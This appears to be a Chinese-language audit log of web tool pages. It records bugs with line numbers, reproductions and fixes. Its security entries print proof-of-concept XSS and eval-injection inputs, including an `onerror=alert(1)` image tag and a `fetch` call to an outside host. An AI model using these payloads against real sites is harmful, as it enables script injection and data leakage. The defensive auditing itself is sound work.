### IT-N483 — convert-11 非法段/非整数输入通过校验并静默输出错误值（中）
- 页面：`tools/it/convert-11.html`
- 行号：`tools/it/convert-11.html:168`（`calc()` 单行体，含 `ps.some(...)` 与 `parseInt(v,10)`）
- 问题：点分校验 `x === '' || +x < 0 || +x > 255` 对 `NaN` 两个比较均为 false，任一段写成非数字即放行，`reduce` 得 `NaN`：`to=bin` → `toBin32(NaN)` 全 0、`to=dot` → `0.0.0.0`、`to=dec` → 字符串 `NaN`。十进制分支 `parseInt(v,10)` 只判范围，`1e3`→1、`12.9`→12、`0x10`→0。
- 复现（`node` 复刻页面原函数逐条实跑）：`from=dot, "1.2.3.x", to=dot` → 实际 `0.0.0.0`；`from=dot, "1a.2.3.4", to=bin` → 实际 `00000000.00000000.00000000.00000000`；`from=dec, "1e3", to=dot` → 实际 `0.0.0.1`；`from=dec, "12.9", to=dot` → 实际 `0.0.0.12`。
- 期望：非法 IPv4 提示“IPv4 格式无效”；十进制仅接受 `/^\d+$/` 且 0–4294967295 的整数（`1e3`→1000 或拒绝，`12.9`/`0x10` 拒绝）。
- 影响：用户以为转换成功，实际得到 0.0.0.0/截断值；`0.0.0.0` 还能通过 `__convert_11ResText` 的 NaN 过滤进入历史与导出。
- 方案：每段加 `/^\d{1,3}$/` 且 `Number.isInteger`、0–255；十进制先 `/^\d+$/` 再 `Number()`。
- 假工具：否

### IT-N484 — cpp-cheatsheet「函数重载」示例与默认参数冲突，add(1) 编译歧义（中）
- 页面：`tools/it/cpp-cheatsheet.html`
- 行号：`tools/it/cpp-cheatsheet.html:365`
- 问题：示例同时给出 `int add(int a, int b = 0)` 与 `int add(int a)`，并调用 `add(1);`；两个候选对 1 个实参的转换序列完全相同 → 歧义。
- 复现：`printf 'int add(int a,int b=0){return a+b;}\nint add(int a){return a+1;}\nint use(){return add(1);}' > /tmp/x.cpp && clang++ -std=c++20 -fsyntax-only /tmp/x.cpp` → 实际 `error: call to 'add' is ambiguous` 并列出两候选；`add(1,2)` 正常。
- 期望：示例可编译（删掉单参重载，或去掉默认参数）。
- 影响：标为“重载”的示例复制后直接编译失败；默认参数+重载本就是常见误区，示例反而示范了错误写法。
- 方案：`int add(int a, int b)` 与 `int add(int a)`，或保留默认参数时删掉单参版本。
- 假工具：否

### IT-N485 — typescript-cheatsheet 非空断言示例对 Element 取 .value，类型检查报错（中）
- 页面：`tools/it/typescript-cheatsheet.html`
- 行号：`tools/it/typescript-cheatsheet.html:520`（同页 `:512` 已给出正确写法 `as HTMLInputElement`）
- 问题：`let el = document.querySelector("#x"); el!.value;` 中 `el` 为 `Element | null`，`!` 只去 null 不去 `Element`，`Element` 上没有 `value`。
- 复现：粘入 `.ts`、`strict` 下 `tsc --noEmit` → 实际 `TS2339: Property 'value' does not exist on type 'Element'`；期望通过（`document.querySelector<HTMLInputElement>("#x")!.value`）。
- 影响：页面教“非空断言”，示例本身类型却不通过，用户会误以为 `!` 能解决类型不匹配。
- 方案：`let el = document.querySelector<HTMLInputElement>("#x"); el!.value;`。
- 假工具：否

### IT-N486 — ruby/cpp/typescript 速查示例用 `--` 作注解，复制粘贴即运行报错（中）
- 页面：`tools/it/ruby-cheatsheet.html`、`tools/it/cpp-cheatsheet.html`、`tools/it/typescript-cheatsheet.html`
- 行号：`ruby-cheatsheet.html:280`、`:288`、`:304`；`cpp-cheatsheet.html:365`、`:413`、`:429`；`typescript-cheatsheet.html:392`、`:408`、`:424`
- 问题：这三门语言没有 `--` 注释（Ruby 用 `#`、TS/C++ 用 `//`），但 `.cmd-example` 把示例与注解放同一文本节点，`copyCode()` 复制整块，注解随代码一起进剪贴板。
- 复现：复制 ruby `p [1, 2, 3]  -- inspect` 运行 → 实际 `TypeError: no implicit conversion of String into Array`（:280）；复制 `PI = 3.14  -- 常量大写` → 实际 `NameError: undefined local variable or method '常量大写'`（:288）。TS/C++ 的 `-- 推断/重载` 同理报未声明标识符/不可赋值。
- 期望：复制出的示例可直接运行。
- 影响：一键复制的主要用途（带走代码）产出不可执行文本。
- 方案：注解改用目标语言注释符（`#` / `//`），不要指望用户手工删注解。
- 假工具：否

### IT-N487 — git-commands「切换到远程分支」示例直接 fatal 失败（中）
- 页面：`tools/it/git-commands.html`
- 行号：`tools/it/git-commands.html:367`
- 问题：`git switch origin/feature` 不是合法用法，`switch` 只接受本地分支名，不会自动创建跟踪分支。
- 复现：`git init; git commit --allow-empty; git update-ref refs/remotes/origin/feature HEAD; git switch origin/feature` → 实际 `fatal: a branch is expected, got remote branch 'origin/feature'`（exit 128，提示改用 `--detach`）。
- 期望：`git switch -c feature origin/feature`（或本地已有跟踪分支时 `git switch feature`）。
- 影响：按示例“切换到远程分支”会直接失败。
- 方案：示例改为 `git switch -c feature origin/feature`；如确需游离 HEAD 用 `git switch --detach origin/feature`。
- 假工具：否

### 覆盖清单（X 批 IT 速查/工具）
- `git-commands`：IT-N479（高，承诺未实现）、IT-N487（中）；无其它高优（搜索/分类过滤逻辑正确，`copyCode` 本体无注入）。低优备注：`git cherry-pick`（:370/:422）与 `git bisect`（:407/:424）各重复一条，使分类计数与表格总数虚增 2。
- `pomodoro`：IT-N480、IT-N481（中）；无高优（模式切换、时长设置、图表/统计渲染主流程可跑）。
- `convert-11`：IT-N483（中）；其余主路径正确（`192.168.1.1 ↔ 3232235777 ↔ 11000000.00000000.00000001.00000001`，`4294967295 ↔ 255.255.255.255 ↔ 全 1` 均对齐）。
- `typescript-cheatsheet`：IT-N485、IT-N486（中）；无高优（泛型/工具类型/`keyof` 等示例经核对正确）。
- `typing-test`：IT-N482（中）；无高优（WPM/准确率公式正确，中文按字/分、英文按 5 字符/词，历史与图表取数正确）。
- `cpp-cheatsheet`：IT-N484、IT-N486（中）；无其它高优（`constexpr` 阶乘、`std::optional`、模板示例经核对正确）。
- `ruby-cheatsheet`：IT-N486（中）；无高优（搜索/分类/复制/图表逻辑正常，块/Proc/Lambda 示例正确）。
- `postgresql-cheatsheet`：无高优/中优（`--` 在 SQL/psql 中是合法注释；`psql` 元命令、DML/DDL、JSONB、`pg_dump -Fc` 与 `pg_restore -j` 组合均与官方文档一致——`-j` 明确支持 custom 与 directory 两种格式）。
- 安全：本批 8 页未发现可利用的安全问题（唯一 HTML 拼接点是 `git-commands` 的静态 `COMMANDS` 与搜索文本匹配，不写入 `innerHTML`；`typing-test` 历史渲染的 localStorage 内容仅在同源自污染范围内，不计）。
- 方法声明：逐页通读 8 页源码；在 `/tmp` 用 `node` 抽取 `git-commands` 的 `COMMANDS` 并对 58 条内联 `onclick` 逐一 `new Function` 编译、用 `python3 html.parser` 验证属性换行保留；用 `node` 复刻 `convert-11` 的 `calc()`/`toBin32()` 逐输入实跑；用 `clang++ -std=c++20 -fsyntax-only` 编译重载示例；用 `ruby`/`ruby -c` 实跑 `--` 注解示例；用真实 `git update-ref` + `git switch` 复现远程分支错误。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在本审计日志追加本节。

## X 批 · IT 速查/编码 II（2026-11-04）

### IT-N488 — JSONPath 过滤表达式直接 eval 用户输入（安全，高）
- 页面：`tools/it/json-path.html`
- 行号：`tools/it/json-path.html:509`（调用处 `:501`，过滤分支 `:386`）
- 问题：`evalFilter()` 仅把 `@.prop` 替换成对应值，随后 `return eval(expr)`，而 `expr` 来自用户在路径输入框里写的 `[?(...)]`。等于把用户输入当 JavaScript 执行。
- 复现：输入 JSON `{"a":[1]}`，路径填 `$.a[?(alert(document.domain))]` → 直接弹窗；填 `[?(fetch('https://example.com/x'))]` 可外发请求。
- 期望：过滤表达式按白名单语法（比较、逻辑、括号、字面量）自行解析，不做 `eval`。
- 影响：任意 JS 在页面源执行（自触发型，需受害者粘贴表达式，但属于可控代码执行）。
- 方案：删除 `eval`，改为分词 + 递归下降求值；至少用 `new Function` 也不行（同样可逃逸）。
- 假工具：否

### IT-N489 — JSONPath 开区间切片死循环，点击自带预设即冻结标签页（高）
- 页面：`tools/it/json-path.html`
- 行号：`tools/it/json-path.html:376`、`tools/it/json-path.html:466`、预设 `tools/it/json-path.html:196`
- 问题：解析 `[-1:]`、`[0:]`、`[1:]` 这类省略上界的切片时，`end` 被赋成 `Infinity`；执行处 `for (let i = token.start; i < token.end; i += step)` 的条件恒真，循环永不退出。
- 复现：用 `node` 复刻 `parseTokens`/切片循环，加入 50 步上限：`$.store.book[-1:]` 得到 `[20, 8, 10, 12, 20]` 后仍继续（判定 `INFINITE`），且负索引起点把末项重复取了一次；`[0:]` 同样判定 `INFINITE`。页面「$.store.book[-1:] 最后一个」预设（`:196`）点击即触发。
- 期望：省略上界按 `current.length` 处理，负起点先折算成 `length + start`。
- 影响：任何开区间切片都会卡死页面；自带预设之一必现。另 `[0:5:2]` 的步长被忽略（解析出 `end=5`、`step` 缺省 1），与公式「按步长遍历」不符。
- 方案：解析阶段不要写入 `Infinity`，运行时按当前数组长度收敛；补齐 `step` 解析。
- 假工具：否

### IT-N490 — JSONPath 高亮结果拼进 innerHTML，JSON 字符串可注入 HTML（安全，高）
- 页面：`tools/it/json-path.html`
- 行号：`tools/it/json-path.html:516`（输出 `:557`）
- 问题：`highlightJSON()` 只做正则加 `<span>`，原样保留 `JSON.stringify` 的内容；`JSON.stringify` 不转义 `<`、`>`、`&`，结果又被赋给 `output.innerHTML`。
- 复现：输入 `{"a":"<img src=x onerror=alert(1)>"}`，路径 `$` → 生成 `<span class="jh-string">"<img src=x onerror=alert(1)>"</span>`，图片加载失败即执行脚本。
- 期望：先对 JSON 文本做 HTML 转义再着色，或改用 `textContent` + DOM 节点着色。
- 影响：任意 HTML/脚本注入（同样是自触发，但属于真实 DOM XSS sink）。
- 方案：`escapeHtml(jsonStr)` 后再跑正则；或按 token 建节点。
- 假工具：否

### IT-N491 — Codabar 编码表大面积非法，默认预设起止符就错（高）
- 页面：`tools/it/barcode-codabar.html`
- 行号：`tools/it/barcode-codabar.html:277`–`:282`
- 问题：`CODABAR` 表与页面自述规则（`:157`「4 条 + 3 空共 7 单元，其中 2 或 3 个为宽元素」）自相矛盾：`$` 为 `NWWWWWN`（5 个宽）、`:` `WNWWWNN`、`/` `WNWWNNW`、`.` `WWNNWNW`、`C` `NWNWWNW`（均 4 个宽）、`D` 只有 6 个单元。按 Codabar 结构（基础 12 符 = 1 宽条 + 1 宽空；`:/.+` = 3 宽条 0 宽空；起止符 A–D = 1 宽条 + 2 宽空）再用 node 逐字符核验，`4/5/6/7/8/9/A/B` 也不符合，20 个字符中共 15 个非法（仅 `0/1/2/3/-` 正确）。
- 复现：`node` 遍历该表统计元素数与宽元素数，见上面 6 个违规项；页面默认预设 `A12345B`（`:448`）与 `C9999D`（`:450`）的 A/B/C/D 全部落在错误集合里。
- 期望：换用权威 Codabar 编码表（AIM BC3-1995 / USD-4）。
- 影响：默认参数生成的条码起止符即非法，扫描器会拒读或误读；并非「个别字符」问题。
- 方案：整表替换并加单元测试（对每个字符校验「7 单元、2–3 宽、条空交替、首尾为条」）。
- 假工具：否

### IT-N492 — 非法字符被静默丢弃，标签却显示原文；不校验起止符（中）
- 页面：`tools/it/barcode-codabar.html`
- 行号：`tools/it/barcode-codabar.html:288`、`tools/it/barcode-codabar.html:329`
- 问题：`buildCodabar()` 遇到表外字符直接 `continue`，不报错；`generate()` 生成的 `label.textContent = raw` 仍是含非法字符的原串。
- 复现：输入 `A12X345B` → 条码实际只编码 `A12345B`，下方文字仍显示 `A12X345B`；输入 `12345`（无起止符）也能生成，但 Codabar 规范要求首尾起止符，读码器无法判读。
- 期望：遇非法字符立即提示并定位；校验首尾必须为 A–D。
- 影响：打印出的条码与页面标注内容不一致，扫码得到的数据与人工核对值不同。
- 方案：非法字符抛错并高亮；生成前做起止符校验（或自动补 A/B）。
- 假工具：否

### IT-N493 — Codabar 承诺「可调整尺寸 / 实时生成 / 可选校验位」均未实现（中）
- 页面：`tools/it/barcode-codabar.html`
- 行号：`tools/it/barcode-codabar.html:10`、`:310`、`:468`、`:194`
- 问题：meta/og 描述写「实时生成…可调整尺寸」；源码把 `narrow=2,wide=6,h=100` 写死（`:310`），没有任何尺寸控件；输入框无 `input` 监听，必须点「生成」；英文简介（`:468`）写 “with an optional check digit”，`:194` 提示「请按规范长度与校验位填写」，但页面无校验位计算。
- 复现：查 DOM 只有 `#data` 一个输入，无宽/高/校验位控件；改输入后条码不刷新，需点按钮。
- 期望：去掉不实描述，或补上尺寸滑块、输入即渲染、校验位开关。
- 影响：宣传与实物不符（属承诺未实现）。
- 方案：按实际能力改文案；若要保留承诺则补控件。
- 假工具：否

### IT-N494 — 「编码识别器」并不识别编码，只做 6 条固定替换（高，假工具）
- 页面：`tools/it/charset-detector.html`
- 行号：`tools/it/charset-detector.html:239`–`:252`、`:405`、`:135`
- 问题：`RULES` 只有两条正则，且第二条 `pattern: /�|�/` 两个分支是同一个 U+FFFD（恒等价于单字符匹配，等于没有独立的 «Latin1» 判据）；`detect()` 只会把 `Ã©/Ã¨/Ã¯/Ã†/â\x80\x98/â\x80\x99` 6 种串做固定替换，从不判定 UTF-8/GBK/Big5/Shift-JIS，不读 BOM，不做字节合法性/统计打分，输出里也不会给出编码名，只说「建议核对编码为 UTF-8/GBK」。
- 复现：页面默认输入 `Ã©Ã¤Ã¢Ã¢Ã«Ã¥Ã¨`（`:135`）→「修复输出」为 `éÃ¤Ã¢Ã¢Ã«Ã¥Ã¨`，7 个乱码单元只修好 1 个；深层解析 `:405` 声称「输入 GBK 字节 `C4E3BAC3` → 识别为 GBK，解码得“你好”」，但页面没有十六进制输入、也没有任何 GBK 解码路径。
- 期望：要么实现真正的探测（BOM 优先、UTF-8 合法性、候选编码打分），要么改名为「乱码修复对照表」并删除识别类承诺。
- 影响：核心功能（识别编码）不存在；用户按文档输入十六进制什么也不会发生。
- 方案：按期望二选一；若保留识别，至少要输出候选编码名与依据。
- 假工具：是

### IT-N495 — 编码识别器把修复结果直接拼进 innerHTML（安全，高）
- 页面：`tools/it/charset-detector.html`
- 行号：`tools/it/charset-detector.html:259`
- 问题：`const __h0=\`<p>${extra}</p><p>修复输出：</p><p>${fixed}</p>\`` 后 `document.getElementById('out').innerHTML=__h0`，`fixed` 是 textarea 原文，未转义。
- 复现：在文本框输入 `<img src=x onerror=alert(1)>` 并点「检测」（载入时 `detect()` 也会执行一次）→ 脚本执行。
- 期望：用 `textContent` 分段渲染，或先 `escapeHtml(fixed)`。
- 影响：任意 HTML/脚本注入（自触发型）。
- 方案：`escapeHtml` 后再拼，或改用 DOM API 建 `<p>`。
- 假工具：否

### IT-N496 — PHP 速查用 `--` 当行内注释，复制后语法错误或输出残字（中）
- 页面：`tools/it/php-cheatsheet.html`
- 行号：`tools/it/php-cheatsheet.html:280`、`:312`、`:336`
- 问题：PHP 没有 `--` 注释。`:280` 的 `<?= $var ?>  -- 等同 echo` 中 `--` 落在 `?>` 之外，会被当普通文本输出；`:312` `strlen($s);  -- 字节` 与 `:336` `$fn = fn($x) => $x * 2;  -- 箭头函数` 中 `--` 是自减运算符，后接中文裸词/常量 → PHP 8 解析或「Undefined constant」错误。
- 复现：把这三段「复制」出的文本存成 `.php` 执行（本机无 php CLI，按 PHP 语法规则判定；`--` 后接裸标识符必然报错）。
- 期望：注解改用 `//` 或 `#`。
- 影响：一键复制的主要用途（带走代码）产出不可执行文本。
- 方案：批量把示例里的 `  -- xxx` 换成 `  // xxx`。
- 假工具：否

### IT-N497 — Kubernetes 速查 `--` 注解被当成额外参数，复制后命令失败（中）
- 页面：`tools/it/kubernetes-cheatsheet.html`
- 行号：`tools/it/kubernetes-cheatsheet.html:405`
- 问题：`kubectl label pod web-xxx env-  -- 删除标签` 中 `--` 是 shell/kubectl 的选项终止符，`删除标签` 会被当作第二个 label 规格。
- 复现：`kubectl label pod web-xxx env- -- 删除标签` → kubectl 报无效 label 规格（不是预期的「删除 env 标签」）。
- 期望：示例改 `kubectl label pod web-xxx env-`，注解放 `#` 行或省略。
- 影响：复制示例直接失败。
- 方案：删除行内中文注解或改 `#`。
- 假工具：否

### IT-N498 — Linux 速查 `--` 注释与 `!!` 注解会被 shell 当参数执行（中）
- 页面：`tools/it/linux-cheatsheet.html`
- 行号：`tools/it/linux-cheatsheet.html:622`、`:686`、`:1174`
- 问题：shell 里 `--` 不是注释。`:1174` 的 `history\n !!  -- 上一条\n !42  -- 第 42 条` 复制后 `!!` 会展开成上一条命令并追加 `-- 上一条` 参数——实际是「重跑上一条命令并多带两个参数」，可能重复执行危险操作；`:622` `echo $!  -- 进程 PID` 只会多打印 `-- 进程 PID`；`:686` `ls -l file.txt  -- rwxr-xr-x ...` 会把后面的说明当文件名，报 cannot access。
- 复现：bash 中先执行 `rm -rf /tmp/x`，再粘贴 `!!  -- 上一条` → 再次执行 `rm -rf /tmp/x`（带多余参数）。
- 期望：注解统一用 `#`，`history` 示例不要用 `!!` 配注解。
- 影响：复制示例可能重跑上一条命令，存在误删/误操作风险。
- 方案：`  -- ` 全部替换为 `  # `。
- 假工具：否

### IT-N499 — Linux 速查 `chmod -R 644 docs/` 会让目录失去执行位（中）
- 页面：`tools/it/linux-cheatsheet.html`
- 行号：`tools/it/linux-cheatsheet.html:390`
- 问题：递归 644 同时作用于目录；目录需要 `x` 位才能进入/遍历。
- 复现：`mkdir -p docs/sub && chmod -R 644 docs && cd docs` → `Permission denied`；`ls docs/sub` 同样失败。
- 期望：文件 644、目录 755（如 `find docs -type d -exec chmod 755 {} +`）。
- 影响：照抄会直接锁死自己的目录访问。
- 方案：示例拆成两条或改用 755。
- 假工具：否

### IT-N500 — Linux 速查 `alias unalias ll` 是无效命令（中）
- 页面：`tools/it/linux-cheatsheet.html`
- 行号：`tools/it/linux-cheatsheet.html:1070`
- 问题：`alias unalias ll` 不是取消别名（`unalias` 才是）；缺 `=` 的 `alias` 只会查询名为 `unalias`/`ll` 的别名并报 not found，示例完全无效。
- 复现：bash 执行 `alias unalias ll` → `-bash: alias: unalias: not found`（无 `=` 时 `alias` 只是查询给定名字，既没定义也没取消别名）。
- 期望：示例写 `unalias ll`。
- 影响：按示例无法取消别名。
- 方案：改为 `unalias ll`。
- 假工具：否

### IT-N501 — Vim 速查用 `--` 当注释，复制后 E488/E518 报错（中）
- 页面：`tools/it/vim-cheatsheet.html`
- 行号：`tools/it/vim-cheatsheet.html:280`、`:320`、`:328`、`:504`、`:512`
- 问题：Vim 命令行/`:set` 都不把 `--` 当注释。`:320` `:q!  -- 不保存退出` → `E488: Trailing characters`；`:504` `:set number  -- 显示行号` → `E518: Unknown option: --`；`:280` `vim +100 file.txt  -- 跳到 100 行` 会把 `跳到`/`100`/`行` 当文件打开；`:512` `:%!jq .  -- 格式化整个文件` 会把注解传给 jq 导致过滤失败。
- 复现：Vim 中依次输入上述命令行，逐条报上述错误。
- 期望：示例去掉行内注解（Vim 内可用 `"` 作注释，但命令行模式不支持行尾注解）。
- 影响：复制出的命令在 Vim 中不可用。
- 方案：删除 `  -- xxx` 注解或移到示例外。
- 假工具：否

### IT-N502 — 昵称生成器词库残留「奶2/喵2/泡2」，会生成乱码昵称（中）
- 页面：`tools/it/nickname-generator.html`
- 行号：`tools/it/nickname-generator.html:261`、`:264`、`:160`
- 问题：`SETS.cute` 的 a 含 `'奶2'`、b 含 `'喵2'`/`'泡2'`，明显是去重脚本留下的后缀；组合会产出「奶2糖」「甜喵2」「奶2泡2」等带数字的垃圾昵称（emoji 风格复用 cute 库，同样中招）。另外 `chinese` 的 a 只有 8 项、b 13 项（8×13=104），与 `:160`「软萌/高冷/诗意/中文四套各 14×14 组合」不符。
- 复现：读 `SETS.cute.a/b` 即可见；`pick(a)+pick(b)` 无过滤，直接输出。
- 期望：清掉 `2` 后缀残留；说明按实际词库数量描述。
- 影响：部分生成结果不可用（把内部去重标记当成词）。
- 方案：删除三项残留，补 `chinese` 词库或改文案。
- 假工具：否

### IT-N503 — 昵称生成器说明承诺「数字后缀 / 固定随机种子 / 长度」均无控件（中）
- 页面：`tools/it/nickname-generator.html`
- 行号：`tools/it/nickname-generator.html:161`、`:10`
- 问题：`:161` 公式说明写「可选追加数字后缀以降低重名概率」「若需要可复现的结果，可固定随机种子」，meta `:10` 写「可设风格与长度」；实际页面只有 `style`（风格）与 `count`（条数）两个控件（`:267` 的 `randInt` 直接取 `crypto.getRandomValues`，无种子参数）。
- 复现：查 DOM `input/select` 只有 `#style`、`#count`；生成结果每次不同，无长度/后缀选项。
- 期望：删除不实描述，或补长度、数字后缀、种子输入。
- 影响：用户按说明找不到对应功能（承诺未实现）。
- 方案：改文案为「按风格随机组合」。
- 假工具：否

### IT-N504 — 昵称生成器批量「一键复制」把多条昵称粘成一串（中）
- 页面：`tools/it/nickname-generator.html`
- 行号：`tools/it/nickname-generator.html:285`
- 问题：`copyResult()` 取 `document.getElementById('output').textContent`，而 10 条结果是 10 个 `<div>`，`textContent` 不带换行/分隔符。
- 复现：生成 10 条后点复制 → 剪贴板为「甜糖软喵…」连写，无法逐条使用。
- 期望：按行 `join('\n')`，或只复制首条。
- 影响：批量复制结果不可用（错误结果）。
- 方案：`Array.from(output.children).map(el=>el.textContent).join('\n')`。
- 假工具：否

### 覆盖清单（X 批 IT 速查/编码 II）
- `json-path`：IT-N488（高，安全）、IT-N489（高，死循环）、IT-N490（高，安全）；无其它高优（预设、递归/通配符/`length()` 主路径正确）。
- `barcode-codabar`：IT-N491（高，编码表）、IT-N492（中）、IT-N493（中）；其余绘制/导出 PNG 主流程可跑。
- `charset-detector`：IT-N494（高，假工具）、IT-N495（高，安全）；无其它高优。
- `php-cheatsheet`：IT-N496（中）；PDO/Composer/trait/命名空间示例均存在，其余命令与语法经核对正确。
- `kubernetes-cheatsheet`：IT-N497（中）；32 条命令的 `kubectl get/apply/scale/rollout/logs/exec/cp` 与 YAML 示例（selector、port、pathType）经核对正确。
- `linux-cheatsheet`：IT-N498、IT-N499、IT-N500（中）；114 条命令主体正确，搜索/分类/复制/图表渲染无注入（数据为静态，渲染前统一 `escapeHtml`）。
- `vim-cheatsheet`：IT-N501（中）；模式/移动/替换/窗口/寄存器示例经核对正确。
- `nickname-generator`：IT-N502、IT-N503、IT-N504（中）；无高优（生成主流程可跑，输出经 `escapeHtml`）。
- 安全：本批 3 条——`json-path` 的 `eval()`（IT-N488）与高亮 `innerHTML`（IT-N490）、`charset-detector` 的 `innerHTML`（IT-N495），均为「用户输入未转义/未隔离」型 DOM 注入，属自触发（无持久化、无跨用户传播路径），但都是真实可控代码执行点，建议按高优修。`barcode-codabar` 的输入只进 `canvas` 与 `textContent`，无注入。
- 假工具：1 个（`charset-detector`，IT-N494）：名为「编码识别器」，实际只做 6 条固定串替换，文档宣称的 GBK 十六进制识别完全不存在。
- 方法声明：逐页通读 8 页源码（含 `_build.py` 注入的图表/表格脚本）；在 `/tmp` 用 `node` 复刻 `json-path` 的 `parseTokens` 与切片循环（带步数上限判定死循环）、`parseInt('5:2')` 验证步长失效；用 `node` 遍历 `CODABAR` 表统计元素数与宽元素数，并对照 Wikipedia Codabar 结构（基础 12 符 1 宽条 + 1 宽空、起止符 1 宽条 + 2 宽空）逐字符核验；用 `hexdump` 确认 `RULES` 第二条正则两个分支均为同一 U+FFFD 字符；逐条比对 `--` 注解在 bash / PHP / kubectl / Vim 的语义。**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做 git 写操作**；未修改任何工具页、代码或构建产物，新增脚本仅落在 `/tmp`，仅在本审计日志追加本节。

## Y 批 · IT 转换/速查（2026-11-04）

- `ascii-tree-generator`：中 2 —— 文件/目录标记冲突会静默丢子树；公式框承诺的「缩进文本推断层级」未实现。
- `barcode-code39`：高 1、中 2 —— 编码表元素数与宽元素数均不符，产出非法 Code 39；Mod 43 校验位与不支持字符处理均与承诺不符。
- `barcode-msi`：中 3 —— 校验位控件缺失、非数字静默剥离、公式框与 `buildMSI` 实现不符。
- `camera-recorder`：中 2 —— 承诺「分辨率选择」无控件；录制中点「关闭摄像头」会触发自动下载。
- `csharp-cheatsheet`：中 1 —— 示例 6 处 `-- 注释` 在 C# 中非法，复制后编译报错。
- `docker-cheatsheet`：中 2 —— 3 处命令尾 `-- 注解` 破坏命令；`docker build` 语法字段写错。
- `emacs-cheatsheet`：中 2 —— 启动命令的 `-- 注解` 被当文件名；撤销条目把 `C-/` 标成「重做」。
- `email-qr`：高 1 —— 二维码为伪随机噪点，无任何 QR 编码/纠错，扫码无效（假工具）。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/ascii-tree-generator.html` | 先出现 `src`（按末段规则被标成文件）再出现 `src/index.js` 时，子路径被静默丢弃：`:273` 仅在节点不存在时写入 `_file`，`:285` 对 `_file=true` 的节点不渲染子级。node 复刻输入 `src` + `src/index.js` 仅输出 `src`，`index.js` 消失。 | IT-N505 |
| `tools/it/ascii-tree-generator.html` | 公式框 `:116` 承诺「支持缩进文本或路径列表…自动推断层级」，实际 `:268` 只按 `/` 切分；粘贴带缩进的树状文本会得到一串扁平根节点，缩进层级被忽略。 | IT-N506 |
| `tools/it/barcode-code39.html` | 编码表 `:246-262` 每字符 15 个宽窄元素（页面自述 `:156`/`:217` 应为 9 元素=5 条 4 空）、宽元素 4–7 个（规范应恰为 3）；`:263-294` 按 15 元素交替生成，单字符 `0` 已产出 82 模块，非合法 Code 39，扫描器无法识别。 | IT-N507 |
| `tools/it/barcode-code39.html` | 承诺「可选 Mod 43 校验位」（`:221`、`:192`、`:517` 英文简介），但页面只有 `:161` 一个文本框，`:318-325` 从未计算或追加校验位，属承诺未实现。 | IT-N508 |
| `tools/it/barcode-code39.html` | `:267-268` 对不在 `CODE39` 表中的字符直接 `continue` 静默丢弃，而 `:304`/`:323` 仍绘制/显示完整原文：输入 `A_中文` 时条码只编码 `A`，下方文字却显示 `A_中文`，条码内容与显示不一致。 | IT-N509 |
| `tools/it/barcode-msi.html` | `:156`/`:157`/`:192` 承诺 Mod 10 / Mod 11 / Mod 1010 校验位可选，但页面仅 `:161` 一个数字输入框，`:247-258` 的 `buildMSI` 不生成任何校验位，属承诺未实现。 | IT-N510 |
| `tools/it/barcode-msi.html` | `:248` 与 `:284` 用 `replace(/\D/g,'')` 静默剥离非数字：输入 `12A3` 时条码只编码 `123`，但 `:286` 的 HTML 文本显示原始 `12A3`（画布内文字为 `123`），显示与编码不一致。 | IT-N511 |
| `tools/it/barcode-msi.html` | 公式框 `:156` 称「每位数字 = 8 个单元（0→窄空宽条，1→宽条窄空）」，实际 `:253` 为 `1→'1110'`（3 模块宽条+窄空）、`0→'10'`（窄条+窄空），每位 8–12 单元不等，且代码中不存在「窄空宽条」形态，说明与实现不符。 | IT-N512 |
| `tools/it/camera-recorder.html` | meta 描述 `:8`/`:11`/`:17` 承诺「支持分辨率选择」，但页面无任何分辨率控件（仅 `:121-123` 三个按钮），`:258` `getUserMedia({video:true,audio:true})` 也未设任何约束；同时公式框 `:107` 写 `{video:true}` 与代码不符。 | IT-N513 |
| `tools/it/camera-recorder.html` | 录制中点「关闭摄像头」（`:123`）经 `:296-298` `stopStream→stopRec`，会触发 `:266-273` 的 `onstop` 无条件自动下载文件；按钮语义仅为关闭摄像头，却产生下载行为。 | IT-N514 |
| `tools/it/csharp-cheatsheet.html` | 示例含 6 处 C# 非法注释：`:293`（`-- 元组`）、`:357`（`-- 仅 init 时可写`、`-- 计算属性`）、`:389`、`:453`（两处）。C# 中 `--` 是自减运算符而非注释（应为 `//`），原样复制编译报语法错误。 | IT-N515 |
| `tools/it/docker-cheatsheet.html` | `:285`/`:293`/`:317` 命令尾 `-- 注解` 会被当作参数或容器名：如 `docker stop $(docker ps -q) -- 停所有` 报 `No such container: 停`，`docker rm -f $(docker ps -aq) -- 删所有` 同理；复制即执行失败。 | IT-N516 |
| `tools/it/docker-cheatsheet.html` | `:427` 语法字段写成 `docker build [options] -t name:path`，把镜像 tag 与构建上下文混为一谈且漏掉必需上下文参数；按此语法照抄构建会失败。 | IT-N517 |
| `tools/it/emacs-cheatsheet.html` | `:280` 的 `emacs -nw file.txt  -- 终端模式` 与 `emacsclient -t file.txt  -- 连接守护进程` 是真实 shell 命令，`--` 后的中文会被当作文件名分别打开（emacs 缓冲/emacsclient 文件），复制执行多开文件。 | IT-N518 |
| `tools/it/emacs-cheatsheet.html` | `:415` 撤销条目 params 写「C-/ 重做」，但 `C-/` 实为撤销（同条 `:416` 示例自己也标「撤销」），重做需先 `C-g` 再 `C-/`；同一行说明自相矛盾，按 params 操作会撤销而非重做。 | IT-N519 |
| `tools/it/email-qr.html` | `:262-282` 的 `renderQR` 只画三个定位符与时序线，其余 29×29 模块全部由 `:275-280` 的 FNV 种子伪随机填充；无数据编码、Reed-Solomon 纠错、格式/版本信息，图案不是 QR 码，扫码无法得到 `mailto:`（假工具，`:160`/`:200` 承诺扫码发邮件）。 | IT-N520 |

**统计**
- 页数：8（`ascii-tree-generator`、`barcode-code39`、`barcode-msi`、`camera-recorder`、`csharp-cheatsheet`、`docker-cheatsheet`、`emacs-cheatsheet`、`email-qr`）。
- 问题：16 条——高 2（IT-N507、IT-N520）/ 中 14。
- 编号区间：IT-N505–IT-N520，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：1 个（`tools/it/email-qr.html`，IT-N520）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户输入均经 `escapeHtml` 或仅写入 `textarea.value`/`canvas`，未发现可控 DOM 注入点。
